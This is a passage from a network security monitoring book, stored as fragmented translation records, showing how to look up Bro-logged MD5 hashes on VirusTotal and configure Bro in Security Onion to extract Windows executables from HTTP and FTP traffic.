- en: 2013-04-12T13:34:01+0000 mBNkJTlLBfa 192.168.2.108 49630 23.62.236.50
  id: totrans-1424
  prefs: []
  type: TYPE_NORMAL
- en: 80 tcp HTTP::MD5v 192.168.2.108 1e39efe30b02fd96b10785b49e23913b http://
  id: totrans-1425
  prefs: []
  type: TYPE_NORMAL
- en: download.cdn.mozilla.net/pub/mozilla.org/firefox/releases/20.0.1/win32/en-US/Firefox
  id: totrans-1426
  prefs: []
  type: TYPE_NORMAL
- en: Setup 20.0.1.exeu 1e39efe30b02fd96b10785b49e23913bw 192.168.2.108 23.62.236.50
  id: totrans-1427
  prefs: []
  type: TYPE_NORMAL
- en: 80 - sov-eth0-1 Notice::ACTION_LOG 6 3600.000000 F
  id: totrans-1428
  prefs: []
  type: TYPE_NORMAL
- en: '- - - - - -- -'
  id: totrans-1429
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 12-2: Bro* notice .log *entry for MD5 calculation*'
  id: totrans-1430
  prefs: []
  type: TYPE_NORMAL
- en: Here, you see the download of *Firefox Setup 20.0.1.exe* u, with Bro’s rec-
  id: totrans-1431
  prefs: []
  type: TYPE_NORMAL
- en: ognition that this is an HTTP and requires MD5 hashing v and a match-
  id: totrans-1432
  prefs: []
  type: TYPE_NORMAL
- en: ing hash 1e39efe30b02fd96b10785b49e23913b w. You can use third-party sources
  id: totrans-1433
  prefs: []
  type: TYPE_NORMAL
- en: with the hash to get more information about this download.
  id: totrans-1434
  prefs: []
  type: TYPE_NORMAL
- en: '***Submitting a Hash to VirusTotal***'
  id: totrans-1435
  prefs: []
  type: TYPE_NORMAL
- en: VirusTotal ( *http://www.virustotal.com/*) is a popular online resource for
  id: totrans-1436
  prefs: []
  type: TYPE_NORMAL
- en: learning more about binaries. In addition to submitting actual files, users
  id: totrans-1437
  prefs: []
  type: TYPE_NORMAL
- en: can also submit hashes of binaries to VirusTotal to see if those hashes are
  id: totrans-1438
  prefs: []
  type: TYPE_NORMAL
- en: '**264** Chapter 12'
  id: totrans-1439
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-1440
  prefs: []
  type: TYPE_NORMAL
- en: '![Image 146](index-299_1.png)'
  id: totrans-1441
  prefs: []
  type: TYPE_IMG
- en: '![Image 147](index-299_2.png)'
  id: totrans-1442
  prefs: []
  type: TYPE_IMG
- en: present in the VirusTotal database. If a previous user has already uploaded
  id: totrans-1443
  prefs: []
  type: TYPE_NORMAL
- en: a binary with the same hash to VirusTotal, a search for that hash should
  id: totrans-1444
  prefs: []
  type: TYPE_NORMAL
- en: reveal what VirusTotal knows about the binary submitted earlier.
  id: totrans-1445
  prefs: []
  type: TYPE_NORMAL
- en: To see this functionality at work, we’ll submit the hash logged by Bro
  id: totrans-1446
  prefs: []
  type: TYPE_NORMAL
- en: from Listing 12-1, as shown in Figure 12-1\.
  id: totrans-1447
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 12-1: Submit ing the observed MD5 hash to VirusTotal*'
  id: totrans-1448
  prefs: []
  type: TYPE_NORMAL
- en: Within a few seconds, we see results like those shown in Figure 12-2\.
  id: totrans-1449
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 12-2: VirusTotal results for the submit ed MD5 hash*'
  id: totrans-1450
  prefs: []
  type: TYPE_NORMAL
- en: VirusTotal has a match for this hash (notice the four angels), and no
  id: totrans-1451
  prefs: []
  type: TYPE_NORMAL
- en: antivirus engines have detected the binary as malicious, as shown in the
  id: totrans-1452
  prefs: []
  type: TYPE_NORMAL
- en: Detection Ratio field.
  id: totrans-1453
  prefs: []
  type: TYPE_NORMAL
- en: The Additional Information tab offers more data on the binaries that
  id: totrans-1454
  prefs: []
  type: TYPE_NORMAL
- en: VirusTotal has seen with the matching MD5 hash, as shown in Listing 12-3\.
  id: totrans-1455
  prefs: []
  type: TYPE_NORMAL
- en: First seen by VirusTotal
  id: totrans-1456
  prefs: []
  type: TYPE_NORMAL
- en: 2013-04-10 22:10:23 UTC ( 6 days, 20 hours ago )
  id: totrans-1457
  prefs: []
  type: TYPE_NORMAL
- en: Last seen by VirusTotal
  id: totrans-1458
  prefs: []
  type: TYPE_NORMAL
- en: 2013-04-17 15:29:15 UTC ( 3 hours, 8 minutes ago )
  id: totrans-1459
  prefs: []
  type: TYPE_NORMAL
- en: File names (max. 25)
  id: totrans-1460
  prefs: []
  type: TYPE_NORMAL
- en: '**Firefox_Setup_20.0.1.exe**'
  id: totrans-1461
  prefs: []
  type: TYPE_NORMAL
- en: '**Firefox Setup 20.0.1.exe**'
  id: totrans-1462
  prefs: []
  type: TYPE_NORMAL
- en: Extending SO **265**
  id: totrans-1463
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-1464
  prefs: []
  type: TYPE_NORMAL
- en: test.exe
  id: totrans-1465
  prefs: []
  type: TYPE_NORMAL
- en: 7zS.sfx.exe
  id: totrans-1466
  prefs: []
  type: TYPE_NORMAL
- en: Firefox_Setup_20.0.1GB32.exe
  id: totrans-1467
  prefs: []
  type: TYPE_NORMAL
- en: TtfjHao4.exe.part
  id: totrans-1468
  prefs: []
  type: TYPE_NORMAL
- en: '**Firefox_Setup_20.0.1.exe**'
  id: totrans-1469
  prefs: []
  type: TYPE_NORMAL
- en: 7zS.sfx
  id: totrans-1470
  prefs: []
  type: TYPE_NORMAL
- en: file-5362262_exe
  id: totrans-1471
  prefs: []
  type: TYPE_NORMAL
- en: Firefox%20Setup%2020.0.1.exe
  id: totrans-1472
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 12-3: First seen, last seen, and filename information from VirusTotal*'
  id: totrans-1473
  prefs: []
  type: TYPE_NORMAL
- en: As highlighted in bold, names referencing Firefox setup ( *Firefox_*
  id: totrans-1474
  prefs: []
  type: TYPE_NORMAL
- en: '*Setup_20.0.1.exe*) are the same as the binary we observed in our Bro logs,'
  id: totrans-1475
  prefs: []
  type: TYPE_NORMAL
- en: but others, like file-5362262_exe, are completely different.
  id: totrans-1476
  prefs: []
  type: TYPE_NORMAL
- en: This analysis is helpful, but not conclusive. It would be better to have
  id: totrans-1477
  prefs: []
  type: TYPE_NORMAL
- en: copies of the binaries themselves, not just their hashes. We could do more
  id: totrans-1478
  prefs: []
  type: TYPE_NORMAL
- en: analysis with the original artifacts.
  id: totrans-1479
  prefs: []
  type: TYPE_NORMAL
- en: '**using bro to extract binaries from Traffic**'
  id: totrans-1480
  prefs: []
  type: TYPE_NORMAL
- en: By default, Bro with SO logs MD5 hashes of binaries downloaded over
  id: totrans-1481
  prefs: []
  type: TYPE_NORMAL
- en: HTTP, but it does not extract the binaries and save them to disk. It’s easy
  id: totrans-1482
  prefs: []
  type: TYPE_NORMAL
- en: to configure Bro to take these actions, however, but we do need to be care-
  id: totrans-1483
  prefs: []
  type: TYPE_NORMAL
- en: ful not to overwhelm the sensor with the extracted binaries. To reduce that
  id: totrans-1484
  prefs: []
  type: TYPE_NORMAL
- en: potential problem, we’ll tell Bro to extract Windows executables downloaded
  id: totrans-1485
  prefs: []
  type: TYPE_NORMAL
- en: over HTTP and FTP only.
  id: totrans-1486
  prefs: []
  type: TYPE_NORMAL
- en: '***Configuring Bro to Extract Binaries from Traffic***'
  id: totrans-1487
  prefs: []
  type: TYPE_NORMAL
- en: Bro inspects traffic and generates logs based on the *policy scripts* that ship
    with the default installation. Policy scripts are the ways analysts use the *Bro*
  id: totrans-1488
  prefs: []
  type: TYPE_NORMAL
- en: '*network programming language* (a term popularized by Liam Randall) to tell'
  id: totrans-1489
  prefs: []
  type: TYPE_NORMAL
- en: the Bro engine what to do with the traffic it sees.
  id: totrans-1490
  prefs: []
  type: TYPE_NORMAL
- en: Bro reports what it finds using logfiles and messages that it creates
  id: totrans-1491
  prefs: []
  type: TYPE_NORMAL
- en: using its *notice framework*. (You’re encouraged to leave the default scripts
  id: totrans-1492
  prefs: []
  type: TYPE_NORMAL
- en: alone, and to make changes to the policy scripts found in the */opt/bro/share/*
  id: totrans-1493
  prefs: []
  type: TYPE_NORMAL
- en: '*bro/site/* directory.)'
  id: totrans-1494
  prefs: []
  type: TYPE_NORMAL
- en: To reconfigure Bro to extract Windows executables downloaded over
  id: totrans-1495
  prefs: []
  type: TYPE_NORMAL
- en: HTTP and FTP, we start by creating a place to store extracted content with
  id: totrans-1496
  prefs: []
  type: TYPE_NORMAL
- en: 'this command:'
  id: totrans-1497
  prefs: []
  type: TYPE_NORMAL
- en: $ **sudo mkdir -p /nsm/bro/extracted/http/ /nsm/bro/extracted/ftp/**
  id: totrans-1498
  prefs: []
  type: TYPE_NORMAL
- en: Next, we create a copy of the *local.bro* policy script for safekeeping.
  id: totrans-1499
  prefs: []
  type: TYPE_NORMAL
- en: $ **sudo cp /opt/bro/share/bro/site/local.bro** **/opt/bro/share/bro/site/local.bro.orig**
    **266** Chapter 12
  id: totrans-1500
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-1501
  prefs: []
  type: TYPE_NORMAL
- en: Now we edit the *local.bro* file. (I’m using the vi editor, but use any editor
    you like, such as the Leafpad program bundled with SO.)
  id: totrans-1502
  prefs: []
  type: TYPE_NORMAL
- en: $ **sudo vi /opt/bro/share/bro/site/local.bro**
  id: totrans-1503
  prefs: []
  type: TYPE_NORMAL
- en: Listing 12-4 shows the content to add at the very bottom of the *local.bro*
    file.
  id: totrans-1504
  prefs: []
  type: TYPE_NORMAL
- en: Extract EXEs
  id: totrans-1505
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: redef HTTP::extract_file_types += /application\/x-dosexec/;u
  id: totrans-1506
  prefs: []
  type: TYPE_NORMAL
- en: redef FTP::extract_file_types += /application\/x-dosexec/;v
  id: totrans-1507
  prefs: []
  type: TYPE_NORMAL
- en: Extract files to /nsm/bro/extracted/
  id: totrans-1508
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: redef HTTP::extraction_prefix = "/nsm/bro/extracted/http/http-item";
  id: totrans-1509
  prefs: []
  type: TYPE_NORMAL
- en: redef FTP::extraction_prefix = "/nsm/bro/extracted/ftp/ftp-file";
  id: totrans-1510
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 12-4: Additions to the end of the* local .bro *file that enable Windows
    executable* *extraction for HTTP and FTP*'
  id: totrans-1511
  prefs: []
  type: TYPE_NORMAL
- en: If you wanted Bro to extract executables from Simple Mail Transfer
  id: totrans-1512
  prefs: []
  type: TYPE_NORMAL
- en: Protocol (SMTP) as well, you could add more lines similar to those in
  id: totrans-1513
  prefs: []
  type: TYPE_NORMAL
- en: Listing 12-4, replacing HTTP with SMTP. Support for extracting binaries from
  id: totrans-1514
  prefs: []
  type: TYPE_NORMAL
- en: Internet Relay Chat (IRC) is possible using the same method. To extract
  id: totrans-1515
  prefs: []
  type: TYPE_NORMAL
- en: more than Windows executables, you could alter u and v so that the
  id: totrans-1516
  prefs: []
  type: TYPE_NORMAL
- en: 'application portions read as follows:'
  id: totrans-1517
  prefs: []
  type: TYPE_NORMAL
- en: /application\/.*/;
  id: totrans-1518
  prefs: []
  type: TYPE_NORMAL
- en: Replacing x-dosexec with .* tells Bro to extract any application type it
  id: totrans-1519
  prefs: []
  type: TYPE_NORMAL
- en: recognizes. You should not run this sort of configuration in production
  id: totrans-1520
  prefs: []
  type: TYPE_NORMAL
- en: because you could overload your sensor as it tries to rebuild and write every-
  id: totrans-1521
  prefs: []
  type: TYPE_NORMAL
- en: thing Bro recognizes. Use /application\/.*/; only to process saved traces
  id: totrans-1522
  prefs: []
  type: TYPE_NORMAL
- en: with limited amounts of traffic.
  id: totrans-1523
  prefs: []
  type: TYPE_NORMAL
- en: Now that we’ve altered Bro’s *local.bro* policy script, let’s test our new
  id: totrans-1524
  prefs: []
  type: TYPE_NORMAL
- en: functionality.
  id: totrans-1525
  prefs: []
  type: TYPE_NORMAL
- en: '***Col ecting Traffic to Test Bro***'
  id: totrans-1526
  prefs: []
  type: TYPE_NORMAL
- en: When adding new capabilities to Bro and your SO installation, you should
  id: totrans-1527
  prefs: []
  type: TYPE_NORMAL
- en: test the changes manually before committing them. Bro allows you to run
  id: totrans-1528
  prefs: []
  type: TYPE_NORMAL
- en: policy scripts and other functionality against saved traffic, and we’ll do this
  id: totrans-1529
  prefs: []
  type: TYPE_NORMAL
- en: to test its newly configured ability to extract binaries from packets.
  id: totrans-1530
  prefs: []
  type: TYPE_NORMAL
- en: To provide the traffic for this test, we will download the Windows SSH
  id: totrans-1531
  prefs: []
  type: TYPE_NORMAL
- en: client PuTTY via HTTP and FTP. The PuTTY website ( *http://www.chiark*
  id: totrans-1532
  prefs: []
  type: TYPE_NORMAL
- en: '*.greenend.org.uk/~sgtatham/putty/download.html*) provides links for download-'
  id: totrans-1533
  prefs: []
  type: TYPE_NORMAL
- en: ing PuTTY via HTTP ( *http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe*)
    and FTP ( *ftp://ftp.chiark.greenend.org.uk/users/sgtatham/putty-latest/x86/putty*
  id: totrans-1534
  prefs: []
  type: TYPE_NORMAL
- en: '*.exe*), giving us ways to test the capabilities we added to Bro. To save the
    traffic for the test, we will determine the IP addresses of the two servers hosting'
  id: totrans-1535
  prefs: []
  type: TYPE_NORMAL
- en: '*putty .exe* via HTTP ( *the.earth.li*) and FTP ( *ftp.chiark.greenend.org.uk*),
    as shown in Listing 12-5, using the Linux host command in a terminal window.'
  id: totrans-1536
  prefs: []
  type: TYPE_NORMAL
- en: Extending SO **267**
  id: totrans-1537
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-1538
  prefs: []
  type: TYPE_NORMAL
- en: '![Image 148](index-302_1.png)'
  id: totrans-1539
  prefs: []
  type: TYPE_IMG
- en: $ **host the.earth.li**
  id: totrans-1540
  prefs: []
  type: TYPE_NORMAL
- en: the.earth.li has address 46.43.34.31u
  id: totrans-1541
  prefs: []
  type: TYPE_NORMAL
- en: the.earth.li has IPv6 address 2001:41c8:10:b1f:c0ff:ee:15:900d
  id: totrans-1542
  prefs: []
  type: TYPE_NORMAL
- en: the.earth.li mail is handled by 10 mail.the.earth.li.
  id: totrans-1543
  prefs: []
  type: TYPE_NORMAL
- en: $ **host ftp.chiark.greenend.org.uk**
  id: totrans-1544
  prefs: []
  type: TYPE_NORMAL
- en: ftp.chiark.greenend.org.uk is an alias for service-name.chiark.greenend.org.
  id: totrans-1545
  prefs: []
  type: TYPE_NORMAL
- en: uk.
  id: totrans-1546
  prefs: []
  type: TYPE_NORMAL
- en: service-name.chiark.greenend.org.uk has address 212.13.197.229v
  id: totrans-1547
  prefs: []
  type: TYPE_NORMAL
- en: service-name.chiark.greenend.org.uk mail is handled by 0 .
  id: totrans-1548
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 12-5: Determining the IP addresses for HTTP and FTP download servers*'
  id: totrans-1549
  prefs: []
  type: TYPE_NORMAL
- en: 'Next, we run two instances of Tcpdump: one configured to log traffic'
  id: totrans-1550
  prefs: []
  type: TYPE_NORMAL
- en: to and from the HTTP server at 46.43.34.31 u, and another to log traffic to
  id: totrans-1551
  prefs: []
  type: TYPE_NORMAL
- en: and from the FTP server at 212.13.197.229 v. Be sure to run the first com-
  id: totrans-1552
  prefs: []
  type: TYPE_NORMAL
- en: 'mand in one terminal, for the HTTP traffic:'
  id: totrans-1553
  prefs: []
  type: TYPE_NORMAL
- en: $ **sudo tcpdump -n -i eth0 -w http-putty.pcap -s 0 host 46.43.34.31**
  id: totrans-1554
  prefs: []
  type: TYPE_NORMAL
- en: 'Run the second command in another terminal, for the FTP traffic:'
  id: totrans-1555
  prefs: []
  type: TYPE_NORMAL
- en: $ **sudo tcpdump -n -i eth0 -w ftp-putty.pcap -s 0 host 212.13.197.229**
  id: totrans-1556
  prefs: []
  type: TYPE_NORMAL
